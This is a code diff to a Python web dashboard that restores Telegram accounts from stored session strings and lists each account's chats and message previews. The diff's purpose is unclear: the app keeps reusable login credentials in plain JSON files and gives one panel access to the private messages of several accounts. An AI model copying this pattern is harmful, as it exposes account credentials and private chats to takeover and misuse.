@@ -57,8 +57,10 @@ def run_async(coro):
 
 def load_existing_sessions():
     """Load persisted sessions from JSON files"""
-    json_files = list(SESSIONS_DIR.glob("*.json"))
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
     
+    json_files = list(SESSIONS_DIR.glob("*.json"))
     print(f"🔍 Found {len(json_files)} JSON files to load")
     
     for json_file in json_files:
@@ -68,34 +70,29 @@ def load_existing_sessions():
             with open(json_file, 'r') as f:
                 data = json.load(f)
             
-            # Skip test sessions
             if data.get('is_test_session'):
                 print(f"⏭️  Skipping test session: {session_id}")
                 continue
             
-            # Check if we have a session_string (required for persistence)
             if 'session_string' not in data:
                 print(f"⚠️  No session_string in {session_id}.json - skipping")
                 continue
             
             print(f"🔄 Attempting to restore session: {session_id}")
             
-            # Create client using session_string
-            client = Client(
-                name=f"{session_id}_restored",
-                api_id=API_ID,
-                api_hash=API_HASH,
-                session_string=data['session_string'],
-                workdir=str(SESSIONS_DIR)
-            )
-            
-            async def reconnect():
+            async def reconnect(sid=session_id, d=data):
+                client = Client(
+                    name=f"{sid}_restored",
+                    api_id=API_ID,
+                    api_hash=API_HASH,
+                    session_string=d['session_string'],
+                )
                 await client.start()
                 me = await client.get_me()
                 return me, client
             
             try:
-                me, connected_client = run_async(reconnect())
+                me, connected_client = loop.run_until_complete(reconnect())
                 active_sessions[session_id] = {
                     'client': connected_client,
                     'phone': data.get('phone'),
@@ -111,8 +108,8 @@ def load_existing_sessions():
         except Exception as e:
             print(f"Error loading session {json_file}: {e}")
 
-# Load sessions in a background thread to avoid blocking startup
-threading.Thread(target=load_existing_sessions, daemon=True).start()
+# Run directly on startup, no thread
+load_existing_sessions()
 
 # ============ WEB DASHBOARD ROUTES ============
 
@@ -143,34 +140,42 @@ def api_get_chats(session_id):
         return jsonify({'error': 'Session not found'}), 404
     
     session_data = active_sessions[session_id]
-    client = session_data['client']
+    session_string = session_data.get('session_string')
+    
+    if not session_string:
+        return jsonify({'error': 'No session string'}), 400
     
     async def fetch_chats():
+        client = Client(
+            name="temp_chats",
+            api_id=API_ID,
+            api_hash=API_HASH,
+            session_string=session_string,
+        )
         try:
+            await client.start()
             chats = []
             async for dialog in client.get_dialogs(limit=50):
                 chat_name = dialog.chat.title or dialog.chat.first_name or "Unknown"
                 chat_id = dialog.chat.id
-
-                # Try top_message first, fall back to empty
                 preview = "No messages"
                 try:
                     if dialog.top_message and dialog.top_message.text:
                         preview = dialog.top_message.text[:50]
                 except:
                     pass
-
                 chats.append({
                     'chat_id': str(chat_id),
                     'name': chat_name,
                     'preview': preview,
                     'username': dialog.chat.username or ''
                 })
-            
             return chats
         except Exception as e:
             print(f"Error fetching chats: {e}")
             return []
+        finally:
+            await client.stop()
     
     chats = run_async(fetch_chats())
     return jsonify({'chats': chats, 'count': len(chats)})
